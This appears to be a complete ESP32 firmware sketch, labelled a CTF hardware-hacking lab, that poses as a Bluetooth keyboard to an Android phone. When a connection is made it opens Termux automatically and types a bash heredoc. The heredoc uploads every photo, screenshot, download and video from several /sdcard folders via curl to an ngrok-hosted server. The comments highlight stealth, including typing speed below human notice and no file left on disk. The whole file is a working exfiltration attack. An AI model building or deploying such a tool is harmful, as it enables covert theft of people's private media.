// ─────────────────────────────────────────────────────────────────────────────
// ESP32 BLE HID — Android Media Exfiltration Lab
// ─────────────────────────────────────────────────────────────────────────────
//
// CTF / Hardware Hacking Lab — Authorized Devices Only.
// USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
//
// WHAT THIS DOES:
//   Mode A — AUTO (default): payload fires automatically on every new BLE
//             connection, after a settle delay. No button press needed.
//   Mode B — MANUAL: press GPIO 19 to fire while already connected.
//
//   On trigger the ESP32 impersonates a Bluetooth keyboard and:
//     STEP 1: Navigates to Android home screen (WIN key alone)
//     STEP 2: Opens Termux via launcher search
//     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
//     STEP 4: Injects a bash heredoc payload that:
//               - Loops /sdcard/DCIM/Camera, /sdcard/Pictures,
//                 /sdcard/Pictures/Screenshots, /sdcard/Download, /sdcard/Movies
//               - Computes SHA-256 for each media file
//               - POSTs every file to WAN_SERVER_URL/upload via curl over ngrok
//
// TECHNIQUE NOTES:
//   - BLE HID spoofing: ESP32 advertises as "ESP32 Keyboard" (legitimate HID device)
//   - Keystroke injection: 35 ms/char — below typical human notice threshold
//   - Heredoc delivery: full bash script injected without dropping any file
//   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
//   - Auto-trigger: fires once per connection; cooldown prevents re-fire on
//     momentary drops. Re-arms only after a full disconnect + reconnect.
//
// SERVER:
//   server/server.py  (port 8019)
//   Run: ngrok http 8019  → paste HTTPS URL in WAN_SERVER_URL below → re-flash
//
// TARGET DEVICE ONE-TIME SETUP (your own device):
//   Install Termux from F-Droid → pkg install curl → termux-setup-storage
// ─────────────────────────────────────────────────────────────────────────────

#include <BleKeyboard.h>

// ── Configuration ─────────────────────────────────────────────────────────────

#define BUTTON_PIN     19
#define WAN_SERVER_URL "https://xxxx-your-ngrok-url.ngrok-free.app"  // ← paste ngrok URL

// AUTO_TRIGGER: set to true  → payload fires automatically on BLE connection
//               set to false → only GPIO 19 button fires the payload
#define AUTO_TRIGGER   true

// How long to wait after BLE connects before injecting keystrokes.
// Android needs ~3 s to register the keyboard and show the home screen.
#define CONNECT_SETTLE_MS  3500

// Minimum time (ms) between two payload executions on the same connection.
// Prevents re-fire if the BLE link momentarily stutters.
#define COOLDOWN_MS       60000UL   // 60 seconds

// ── State ─────────────────────────────────────────────────────────────────────

BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);

bool     wasConnected   = false;   // tracks previous connection state
bool     payloadFired   = false;   // true once payload has run this session
unsigned long connectedAt   = 0;   // millis() when BLE connected
unsigned long lastFireMs    = 0;   // millis() when payload last ran
bool     lastButtonState    = HIGH;

// ── Helpers ───────────────────────────────────────────────────────────────────

void typeString(const char* str, int delayMs = 35) {
  for (int i = 0; i < (int)strlen(str); i++) {
    bleKeyboard.print(str[i]);
    delay(delayMs);
  }
}

void pressEnter(int waitMs = 200) {
  bleKeyboard.press(KEY_RETURN);
  delay(120);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// WIN alone → Home screen on all Android launchers.
// WIN+S = screenshot — do NOT use that.
void goHome(int waitMs = 1200) {
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(150);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// WIN → Home → type app name → Enter → wait for app to load.
void openApp(const char* appName, int waitMs = 3000) {
  goHome(1200);
  delay(300);
  typeString(appName, 60);   // 60 ms/char — slow enough for search overlay
  delay(1000);
  pressEnter(waitMs);
}

// Type one heredoc line then press Enter.
void typeLine(const char* line) {
  typeString(line, 35);
  pressEnter(120);
}

// ── Payload ───────────────────────────────────────────────────────────────────
// Full injection sequence: open Termux → clear prompt → inject bash heredoc.

void runPayload() {
  Serial.println("[payload] Starting injection sequence...");

  // ── STEP 1: Open Termux ──────────────────────────────────────────────────
  openApp("Termux", 3000);
  Serial.println("[payload] Step 1 done: Termux opened.");

  // ── STEP 2: Clear any existing prompt input ──────────────────────────────
  // CTRL+C kills any running foreground process (no-op if idle).
  // CTRL+U clears the current line so the heredoc starts clean.
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
  delay(100); bleKeyboard.releaseAll(); delay(400);

  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
  delay(100); bleKeyboard.releaseAll(); delay(400);
  Serial.println("[payload] Step 2 done: prompt cleared.");

  // ── STEP 3: Inject bash heredoc ─────────────────────────────────────────
  //
  // WHY HEREDOC:
  //   Typing separate curl commands line-by-line causes the JSON responses
  //   to interleave with the next line being typed, because the ESP32 does
  //   not wait for bash to finish executing before continuing.
  //   With a heredoc, bash buffers the entire script until UPLOAD_END, then
  //   executes it sequentially. The ESP32 only needs to wait for typing to
  //   finish — not for uploads to complete.
  //
  Serial.println("[payload] Step 3: injecting heredoc...");

  typeLine("bash << 'UPLOAD_END'");
  typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
  typeLine("upload_dir() {");
  typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
  typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
  typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
  typeLine("  done");
  typeLine("}");
  typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
  typeLine("upload_dir /sdcard/Pictures             Pictures");
  typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
  typeLine("upload_dir /sdcard/Download             Downloads");
  typeLine("upload_dir /sdcard/Movies               Movies");
  typeLine("echo '====== ALL DONE ======'");
  typeLine("UPLOAD_END");

  Serial.println("[payload] Step 3 done: heredoc typed — bash executing uploads.");
  Serial.println("[payload] Injection complete.");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(BUTTON_PIN, INPUT_PULLUP);

  bleKeyboard.set_vendor_id(0x16C0);
  bleKeyboard.set_product_id(0x27DB);
  bleKeyboard.set_version(0x0100);
  bleKeyboard.begin();

  Serial.println("─────────────────────────────────────────");
  Serial.println("  ESP32 BLE HID — Media Exfiltration Lab");
  Serial.println("─────────────────────────────────────────");
  Serial.print  ("  Server  : "); Serial.println(WAN_SERVER_URL);
  Serial.print  ("  Mode    : "); Serial.println(AUTO_TRIGGER ? "AUTO (fires on BLE connect)" : "MANUAL (GPIO 19 button)");
  Serial.print  ("  Settle  : "); Serial.print(CONNECT_SETTLE_MS); Serial.println(" ms after connect");
  Serial.print  ("  Cooldown: "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
  Serial.println("  Waiting for BLE connection...");
  Serial.println("─────────────────────────────────────────");
}

// ── Loop ──────────────────────────────────────────────────────────────────────

void loop() {
  bool connected = bleKeyboard.isConnected();
  unsigned long now = millis();

  // ── Connection state change ───────────────────────────────────────────────
  if (connected && !wasConnected) {
    // Fresh connection
    connectedAt  = now;
    payloadFired = false;   // re-arm for this session
    wasConnected = true;
    Serial.println("[BLE] Connected — device paired.");
    if (AUTO_TRIGGER) {
      Serial.print("[BLE] Auto-trigger armed. Firing in ");
      Serial.print(CONNECT_SETTLE_MS);
      Serial.println(" ms...");
    }
  }
  else if (!connected && wasConnected) {
    // Disconnected — reset for next connection
    wasConnected = false;
    Serial.println("[BLE] Disconnected. Waiting for next connection...");
  }

  // ── Auto-trigger on connect ───────────────────────────────────────────────
  if (AUTO_TRIGGER && connected && !payloadFired) {
    // Wait CONNECT_SETTLE_MS after connection before firing
    if (now - connectedAt >= CONNECT_SETTLE_MS) {
      // Also enforce cooldown (extra safety on rapid reconnects)
      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
        payloadFired = true;
        lastFireMs   = now;
        Serial.println("[AUTO] Settle delay elapsed → firing payload.");
        runPayload();
      }
    }
  }

  // ── Manual trigger — GPIO 19 button ──────────────────────────────────────
  if (connected) {
    bool buttonState = digitalRead(BUTTON_PIN);

    if (lastButtonState == HIGH && buttonState == LOW) {
      // Debounce: enforce cooldown between manual fires too
      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
        lastFireMs = now;
        Serial.println("[MANUAL] GPIO 19 pressed → firing payload.");
        runPayload();
      } else {
        unsigned long remaining = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
        Serial.print("[MANUAL] Cooldown active — ");
        Serial.print(remaining);
        Serial.println(" s remaining.");
      }
    }
    lastButtonState = buttonState;
  }

  delay(10);
}
